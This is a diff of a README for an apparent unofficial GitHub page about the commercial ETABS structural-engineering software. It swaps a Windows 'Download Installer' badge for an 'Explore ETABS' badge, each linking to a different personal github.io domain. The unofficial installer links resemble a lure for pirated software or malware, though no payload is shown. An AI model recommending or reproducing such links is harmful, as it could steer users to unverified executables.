@@ -4,7 +4,7 @@
   <img src="https://assets-us-01.kc-usercontent.com/1ca05609-4ad1-009e-bc40-2e1230b16a75/8a9aaf2d-529f-4357-bd62-1d9a2a9c4b6a/etabs19-s.png" alt="Program Logo"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ahmetdemire.github.io/.github/ETABS-Structural-Engine)
+[![Explore ETABS](https://img.shields.io/badge/Explore-ETABS-0284C7?style=for-the-badge)](https://etabs-engine.github.io/.github/)
 
 ---
 
@@ -24,7 +24,7 @@ Continuous innovation in building design is supported through this professional 
   <img src="https://www.csiamerica.com/site/product/etabs/product-features/AS%204100-2020%20steel%20design.png" alt="Program Interface Screenshot"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ahmetdemire.github.io/.github/ETABS-Structural-Engine)
+[![Explore ETABS](https://img.shields.io/badge/Explore-ETABS-0284C7?style=for-the-badge)](https://etabs-engine.github.io/.github/)
 
 ---
 
